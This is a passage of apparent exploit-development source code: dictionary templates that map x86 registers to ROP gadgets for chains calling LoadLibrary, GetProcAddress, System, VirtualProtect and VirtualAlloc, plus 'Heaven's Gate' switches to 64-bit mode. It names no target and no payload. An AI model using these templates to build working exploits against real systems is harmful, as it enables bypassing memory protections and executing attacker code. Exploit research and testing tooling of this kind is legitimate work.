		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
		'7': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'},
		'8': {'r': 'eax', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'}         
        },

        'LoLi8':{ 
		'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'2': {'r': 'eax', 'val': 'targetDllString', 'excluded':[],"r2":"",'com':'Target DLL string'},
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'loadLibraryPtr', 'excluded':[], "r2":"",'com':'Ptr to LoadLibrary'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'8': {'r': 'ecx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'}
        },

        'LoLi9':{ 
		'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'2': {'r': 'eax', 'val': 'targetDllString', 'excluded':[],"r2":"",'com':'Target DLL string'},
		'3': {'r': 'esi', 'val': 'loadLibraryPtr', 'excluded':[], "r2":"",'com':'Ptr to LoadLibrary'},
		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
		'8': {'r': 'ecx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'}
        },
        'GPA1':{ 
		'1': {'r': 'ecx', 'val': 'hModule', 'excluded':[], "r2":"",'com':'hModule'},
		'2': {'r': 'eax', 'val': 'lpProcName', 'excluded':[],"r2":"",'com':'lpProcName'},
		'3': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":8,'com':''},
		'4': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'ropNop'},
		'5': {'r': 'ebp', 'val': 'GetProcAddressPTR', 'excluded':[], "r2":"",'com':'Ptr to GetProcAddress'},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return Address'}
        },
       'GPA2':{ 
		'1': {'r': 'ecx', 'val': 'hModule', 'excluded':[], "r2":"",'com':'hModule'},
		'2': {'r': 'eax', 'val': 'lpProcName', 'excluded':[],"r2":"",'com':'lpProcName'},
		'3': {'r': 'edi', 'val': 'pop', 'excluded':["ecx", "esi"], "r2":'','com':''},
		'4': {'r': 'esi', 'val': 'GetProcAddressPTR', 'excluded':[], "r2":"",'com':'Ptr to GetProcAddress'},
		'5': {'r': 'ebp', 'val': 'pop', 'excluded':["ecx","esi"], "r2":"",'com':''},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return Address'}
        },
     'GPA3':{ 
		'1': {'r': 'ecx', 'val': 'hModule', 'excluded':[], "r2":"",'com':'hModule'},
		'2': {'r': 'eax', 'val': 'lpProcName', 'excluded':[],"r2":"",'com':'lpProcName'},
		'3': {'r': 'edi', 'val': 'pop', 'excluded':["ecx","esi"], "r2":'','com':''},
		'4': {'r': 'esi', 'val': 'GetProcAddressPTR', 'excluded':[], "r2":"",'com':'Ptr to GetProcAddress'},
		'5': {'r': 'ebp', 'val': 'addESP', 'excluded':["ecx","esi"], "r2":'4','com':''},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return Address'}
        },
       'GPA4':{ 
		'1': {'r': 'ecx', 'val': 'hModule', 'excluded':[], "r2":"",'com':'hModule'},
		'2': {'r': 'eax', 'val': 'lpProcName', 'excluded':[],"r2":"",'com':'lpProcName'},
		'3': {'r': 'edi', 'val': 'addESP', 'excluded':["ecx"], "r2":'0xc','com':''},
		'4': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':''},
		'5': {'r': 'ebp', 'val': 'GetProcAddressPTR', 'excluded':[], "r2":"",'com':'Ptr to GetProcAddress'},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return Address'}
        },
     'GPA5':{ 
		'1': {'r': 'ecx', 'val': 'hModule', 'excluded':[], "r2":"",'com':'hModule'},
		'2': {'r': 'eax', 'val': 'lpProcName', 'excluded':[],"r2":"",'com':'lpProcName'},
		'3': {'r': 'edi', 'val': 'addESP', 'excluded':["ecx"], "r2":'0xc','com':''},
		'4': {'r': 'esi', 'val': 'GetProcAddressPTR', 'excluded':[], "r2":"",'com':'Ptr to GetProcAddress'},
		'5': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return Address'}
        },
       'GPA6':{ 
		'1': {'r': 'ecx', 'val': 'hModule', 'excluded':[], "r2":"",'com':'hModule'},
		'2': {'r': 'eax', 'val': 'lpProcName', 'excluded':[],"r2":"",'com':'lpProcName'},
		'3': {'r': 'edi', 'val': 'addESP', 'excluded':["ecx"], "r2":'4','com':''},
		'4': {'r': 'esi', 'val': 'GetProcAddressPTR', 'excluded':[], "r2":"",'com':'Ptr to GetProcAddress'},
		'5': {'r': 'ebp', 'val': 'addESP', 'excluded':[], "r2":"4",'com':''},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return Address'}
        },
     'GPA7':{ 
		'1': {'r': 'ecx', 'val': 'hModule', 'excluded':[], "r2":"",'com':'hModule'},
		'2': {'r': 'eax', 'val': 'lpProcName', 'excluded':[],"r2":"",'com':'lpProcName'},
		'3': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'4': {'r': 'esi', 'val': 'addESP', 'excluded':[], "r2":"4",'com':''},
		'5': {'r': 'ebp', 'val': 'GetProcAddressPTR', 'excluded':[], "r2":"",'com':'Ptr to GetProcAddress'},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return Address'}
        },
       'GPA8':{ 
		'1': {'r': 'ecx', 'val': 'hModule', 'excluded':[], "r2":"",'com':'hModule'},
		'2': {'r': 'eax', 'val': 'lpProcName', 'excluded':[],"r2":"",'com':'lpProcName'},
		'3': {'r': 'edi', 'val': 'addESP', 'excluded':["ecx"], "r2":'0xc','com':''},
		'4': {'r': 'esi', 'val': 'ret_c2', 'excluded':[], "r2":4,'com':''},
		'5': {'r': 'ebp', 'val': 'GetProcAddressPTR', 'excluded':[], "r2":"",'com':'Ptr to GetProcAddress'},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return Address'}
        },

     'GPA9':{ 
		'1': {'r': 'ecx', 'val': 'hModule', 'excluded':[], "r2":"",'com':'hModule'},
		'2': {'r': 'eax', 'val': 'lpProcName', 'excluded':[],"r2":"",'com':'lpProcName'},
		'3': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":4,'com':''},
		'4': {'r': 'esi', 'val': 'addESP', 'excluded':[], "r2":"4",'com':''},
		'5': {'r': 'ebp', 'val': 'GetProcAddressPTR', 'excluded':[], "r2":"",'com':'Ptr to GetProcAddress'},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return Address'}
        },
       'GPA10':{ 
		'1': {'r': 'ecx', 'val': 'hModule', 'excluded':[], "r2":"",'com':'hModule'},
		'2': {'r': 'eax', 'val': 'lpProcName', 'excluded':[],"r2":"",'com':'lpProcName'},
		'3': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'4': {'r': 'esi', 'val': 'pop', 'excluded':["ecx","ebp"], "r2":"",'com':''},
		'5': {'r': 'ebp', 'val': 'GetProcAddressPTR', 'excluded':[], "r2":"",'com':'Ptr to GetProcAddress'},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return Address'}
        },

     'GPA11':{ 
		'1': {'r': 'ecx', 'val': 'hModule', 'excluded':[], "r2":"",'com':'hModule'},
		'2': {'r': 'eax', 'val': 'lpProcName', 'excluded':[],"r2":"",'com':'lpProcName'},
		'3': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'4','com':''},
		'4': {'r': 'esi', 'val': 'GetProcAddressPTR', 'excluded':[], "r2":"",'com':'Ptr to GetProcAddress'},
		'5': {'r': 'ebp', 'val': 'pop', 'excluded':["ecx","esi"], "r2":"",'com':''},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return Address'},
        },
       'SYS1':{ 
		'1': {'r': 'ebp', 'val': 'SystemPTR', 'excluded':[], "r2":"",'com':'Ptr to System'},
		'2': {'r': 'ecx', 'val': 'Command', 'excluded':[], "r2":"",'com':'Command'},
		'3': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":8,'com':''},
		'4': {'r': 'eax', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'},
		'5': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'}
        },
       'SYS2':{ 
		'1': {'r': 'esi', 'val': 'SystemPTR', 'excluded':[], "r2":"",'com':'Ptr to System'},
		'2': {'r': 'ecx', 'val': 'Command', 'excluded':[], "r2":"",'com':'Command'},
		'3': {'r': 'edi', 'val': 'pop', 'excluded':["esi"], "r2":'','com':''},
		'4': {'r': 'eax', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'},
		'5': {'r': 'ebp', 'val': 'pop', 'excluded':["esi"], "r2":"",'com':''},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'}
        },
       'SYS3':{ 
		'1': {'r': 'ebp', 'val': 'SystemPTR', 'excluded':[], "r2":"",'com':'Ptr to System'},
		'2': {'r': 'ecx', 'val': 'Command', 'excluded':[], "r2":"",'com':'Command'},
		'3': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'4': {'r': 'eax', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'},
		'5': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'}
        },
       'SYS4':{ 
		'1': {'r': 'esi', 'val': 'SystemPTR', 'excluded':[], "r2":"",'com':'Ptr to System'},
		'2': {'r': 'ecx', 'val': 'Command', 'excluded':[], "r2":"",'com':'Command'},
		'3': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'4': {'r': 'eax', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'},
		'5': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'ebx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
		'8': {'r': 'edx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'}
        },
       'SYS5':{ 
		'1': {'r': 'ebp', 'val': 'SystemPTR', 'excluded':[], "r2":"",'com':'Ptr to System'},
		'2': {'r': 'eax', 'val': 'Command', 'excluded':[],"r2":"",'com':'Command'},
		'3': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":0x8,'com':''},
		'4': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'8': {'r': 'ecx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'}
        },
       'SYS6':{ 
		'1': {'r': 'ebx', 'val': 'SystemPTR', 'excluded':[], "r2":"",'com':'Ptr to System'},
		'2': {'r': 'eax', 'val': 'Command', 'excluded':[],"r2":"",'com':'Command'},
		'3': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":'','com':'Rop nop'},
		'4': {'r': 'esi', 'val': 'ret_c2', 'excluded':[], "r2":8,'com':''},
		'5': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'6': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'edx', 'val': 'JmpDword', 'excluded':[], "r2":"ebx",'com':''},
		'8': {'r': 'ecx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'}
        },
	   'SYS7':{ 
		'1': {'r': 'esi', 'val': 'SystemPTR', 'excluded':[], "r2":"",'com':'Ptr to System'},
		'2': {'r': 'eax', 'val': 'Command', 'excluded':[],"r2":"",'com':'Command'},
		'3': {'r': 'edi', 'val': 'pop', 'excluded':["esi"], "r2":'','com':''},
		'4': {'r': 'ebp', 'val': 'pop', 'excluded':["esi"], "r2":"",'com':''},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
		'8': {'r': 'ecx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'}
        },
	   'SYS8':{ 
		'1': {'r': 'ebp', 'val': 'SystemPTR', 'excluded':[], "r2":"",'com':'Ptr to System'},
		'2': {'r': 'eax', 'val': 'Command', 'excluded':[],"r2":"",'com':'Command'},
		'3': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'4': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'JmpDword', 'excluded':[], "r2":"ebp",'com':''},
		'8': {'r': 'ecx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'}
        },
	   'SYS9':{ 
		'1': {'r': 'esi', 'val': 'SystemPTR', 'excluded':[], "r2":"",'com':'Ptr to System'},
		'2': {'r': 'eax', 'val': 'Command', 'excluded':[],"r2":"",'com':'Command'},
		'3': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'JmpDword', 'excluded':[], "r2":"esi",'com':''},
		'8': {'r': 'ecx', 'val': 'returnAddress', 'excluded':[], "r2":"",'com':'Return address'}
        },
	   'HG321':{ 
		'1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":8,'com':''},
		'2': {'r': 'eax', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'},
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'retf', 'excluded':[], "r2":"",'com':''},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'jmp', 'excluded':[], "r2":"ebp",'com':'Jmp to retf'},
		'7': {'r': 'edx', 'val': 'destination0x33', 'excluded':[], "r2":"",'com':'Destination address'},
		'8': {'r': 'ecx', 'val': 'cs0x33', 'excluded':[], "r2":"",'com':'CS 0x33 selector for 64-bit'}
		},
		'HG322':{ 
		'1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":8,'com':''},
		'2': {'r': 'eax', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'},
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'retf', 'excluded':[], "r2":"",'com':''},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'jmp', 'excluded':[], "r2":"ebp",'com':'Jmp to retf'},
		'7': {'r': 'edx', 'val': 'destination0x33', 'excluded':[], "r2":"",'com':'Destination address'},
		'8': {'r': 'ecx', 'val': 'cs0x33', 'excluded':[], "r2":"",'com':'CS 0x33 selector for 64-bit'}
		},
		'HG323':{ 
		'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'2': {'r': 'eax', 'val': 'ropNop', 'excluded':[],"r2":"",'com':'Rop nop'},
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'retf', 'excluded':[], "r2":"",'com':''},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'jmp', 'excluded':[], "r2":"ebp",'com':'Jmp to retf'},
		'7': {'r': 'edx', 'val': 'destination0x33', 'excluded':[], "r2":"",'com':'Destination address'},
		'8': {'r': 'ecx', 'val': 'cs0x33', 'excluded':[], "r2":"",'com':'CS 0x33 selector for 64-bit'}
		},
		'HG324':{ 
		'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'2': {'r': 'eax', 'val': 'cs0x33', 'excluded':[],"r2":"",'com':'CS 0x33 selector for 64-bit'},
		'3': {'r': 'esi', 'val': 'retf', 'excluded':[], "r2":"",'com':''},
		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'jmp', 'excluded':[], "r2":"esi",'com':'Jmp to retf'},
		'8': {'r': 'ecx', 'val': 'destination0x33', 'excluded':[], "r2":"",'com':'Destination address'}
		},
		'HG325':{ 
		'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0xc','com':''},
		'2': {'r': 'eax', 'val': 'cs0x33', 'excluded':[],"r2":"",'com':'CS 0x33 selector for 64-bit'},
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'retf', 'excluded':[], "r2":"",'com':''},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'jmp', 'excluded':[], "r2":"ebp",'com':'Jmp to retf'},
		'8': {'r': 'ecx', 'val': 'destination0x33', 'excluded':[], "r2":"",'com':'Destination address'}
		},
		'HG326':{ 
		'1': {'r': 'edi', 'val': 'addESP', 'excluded':[], "r2":'0x10','com':''},
		'2': {'r': 'eax', 'val': 'cs0x33', 'excluded':[],"r2":"",'com':'CS 0x33 selector for 64-bit'},
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'retf', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'edx', 'val': 'jmp', 'excluded':[], "r2":"ebx",'com':'Jmp to retf'},
		'8': {'r': 'ecx', 'val': 'destination0x33', 'excluded':[], "r2":"",'com':'Destination address'}
		},
		'HG327':{ 
		'1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":0xc,'com':''},
		'2': {'r': 'eax', 'val': 'cs0x33', 'excluded':[],"r2":"",'com':'CS 0x33 selector for 64-bit'},
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'retf', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'edx', 'val': 'jmp', 'excluded':[], "r2":"ebx",'com':'Jmp to retf'},
		'8': {'r': 'ecx', 'val': 'destination0x33', 'excluded':[], "r2":"",'com':'Destination address'}
		},
		'HG328':{ 
		'1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":0xc,'com':''},
		'2': {'r': 'eax', 'val': 'cs0x33', 'excluded':[],"r2":"",'com':'CS 0x33 selector for 64-bit'},
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'retf', 'excluded':[], "r2":"",'com':''},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"ebp",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'jmp', 'excluded':[], "r2":"ebp",'com':'Jmp to retf'},
		'8': {'r': 'ecx', 'val': 'destination0x33', 'excluded':[], "r2":"",'com':'Destination address'}
        },

		'HG329':{ 
		'1': {'r': 'edi', 'val': 'popLoad', 'excluded':[], "r2":'edi','com':''},
		'2': {'r': 'eax', 'val': 'cs0x33', 'excluded':[],"r2":"",'com':'CS 0x33 selector for 64-bit'},
		'3': {'r': 'esi', 'val': 'retf', 'excluded':[], "r2":"",'com':''},
		'4': {'r': 'ebp', 'val': 'pop', 'excluded':['edi'], "r2":"",'com':''},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'jmp', 'excluded':[], "r2":"edi",'com':'Jmp to retf'},
		'8': {'r': 'ecx', 'val': 'destination0x33', 'excluded':[], "r2":"",'com':'Destination address'}
        },
        'HG3210':{ 
		'1': {'r': 'edi', 'val': 'ret_c2', 'excluded':[], "r2":0xc,'com':''},
		'2': {'r': 'eax', 'val': 'cs0x33', 'excluded':[],"r2":"",'com':'CS 0x33 selector for 64-bit'},
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'retf', 'excluded':[], "r2":"",'com':''},
		'8': {'r': 'ecx', 'val': 'destination0x33', 'excluded':[], "r2":"",'com':'Destination address'}
        },
		'HG3211':{ 
		'1': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":'','com':'Rop nop'},
		'2': {'r': 'eax', 'val': 'cs0x33', 'excluded':[],"r2":"",'com':'CS 0x33 selector for 64-bit'},
		'3': {'r': 'esi', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'4': {'r': 'ebp', 'val': 'pop', 'excluded':[], "r2":"",'com':''},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':''},
		'6': {'r': 'ebx', 'val': 'ropNop', 'excluded':[], "r2":"",'com':'Rop nop'},
		'7': {'r': 'edx', 'val': 'retf', 'excluded':[], "r2":"",'com':''},
		'8': {'r': 'ecx', 'val': 'destination0x33', 'excluded':[], "r2":"",'com':'Destination address'}
        },

		'VP1':{ 
		'1': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":'','com':'Rop nop'},
		'8': {'r': 'eax', 'val': 'VPPtr', 'excluded':[],"r2":"",'com':'VirtualProtect ptr'},
		
		'3': {'r': 'esi', 'val': 'JmpDword', 'excluded':[], "r2":"eax",'com':''},

		'6': {'r': 'ebp', 'val': 'pop', 'excluded':[], "r2":"",'com':''},
		'2': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':'LpAddress - automatic - skip'},
		'7': {'r': 'ebx', 'val': 'dwSize', 'excluded':[], "r2":"",'com':'dwSize'},
		'5': {'r': 'edx', 'val': 'flNewProtect', 'excluded':[], "r2":"",'com':'flNewProtect - 0x40'},
		'4': {'r': 'ecx', 'val': 'flOldProtect', 'excluded':[], "r2":"",'com':'flOldProtect - any writable memory address!'}
        },
        'VP2':{ 
		'1': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":'esi','com':''},
		'8': {'r': 'eax', 'val': 'nop', 'excluded':[],"r2":"",'com':''},
		
		'3': {'r': 'esi', 'val': 'VPPtr2', 'excluded':[], "r2":"eax",'com':''},

		'4': {'r': 'ebp', 'val': 'JmpESP', 'excluded':[], "r2":"",'com':''},
		'2': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':'LpAddress - automatic - skip'},
		'7': {'r': 'ebx', 'val': 'dwSize', 'excluded':[], "r2":"",'com':'dwSize'},
		'5': {'r': 'edx', 'val': 'flNewProtect', 'excluded':[], "r2":"",'com':'flNewProtect - 0x40'},
		'6': {'r': 'ecx', 'val': 'flOldProtect', 'excluded':[], "r2":"",'com':'flOldProtect - any writable memory address!'}
        },

        'VA1':{ 
		'8': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":'','com':''},
		'2': {'r': 'eax', 'val': 'nop', 'excluded':[],"r2":"",'com':''},
		'3': {'r': 'esi', 'val': 'VAPtr2', 'excluded':[], "r2":"",'com':''},
		'4': {'r': 'ebp', 'val': 'JmpESP', 'excluded':[], "r2":"",'com':''},
		'5': {'r': 'esp', 'val': 'skip', 'excluded':[], "r2":"",'com':' LpAddress - automatic skip '},
		'6': {'r': 'ebx', 'val': 'dwSize2', 'excluded':[], "r2":"",'com':''},
		'7': {'r': 'edx', 'val': 'flAllocationType', 'excluded':[], "r2":"",'com':''},
		'1': {'r': 'ecx', 'val': 'flNewProtect', 'excluded':[], "r2":"",'com':' flNewProtect '}
		},
        
        'VA2':{ 
		'8': {'r': 'edi', 'val': 'ropNop', 'excluded':[], "r2":'','com':''},
